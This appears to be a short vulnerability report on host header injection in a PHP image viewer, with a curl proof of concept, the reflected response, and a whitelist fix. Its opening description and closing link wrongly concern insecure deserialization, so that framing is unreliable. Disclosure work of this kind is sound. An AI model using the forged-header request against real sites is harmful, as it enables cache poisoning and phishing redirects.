### Description

Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks,including replay attacks, injection attacks, and privilege escalation attacks.

refers : 
* https://portswigger.net/kb/issues/00200200_http-response-header-injection 
* https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization

### Issue 

It is possible to Host Header Injection on server and it will reflect in web page.

### Exploit 


```console
curl -i http://0 --header "host:example.com"
```

Get Response : 

```html
HTTP/1.1 200 OK
Host: example.com
Date: Fri, 20 Dec 2019 22:35:47 +0530
Connection: close
X-Powered-By: PHP/7.2.9-1
Content-type: text/html; charset=UTF-8

<!DOCTYPE html>
<body>
<center>
<fieldset>
<legend>IMG viewer</legend>
<img width="500" src="http://example.com/img.png" >
</fieldset>
</center>
</body>
</html>	
```
### Fix 

Server reject anything that doesn't match with the white listed host 

---

- Other resources :

Video about php deserialization : https://www.youtube.com/watch?v=HaW15aMzBUM
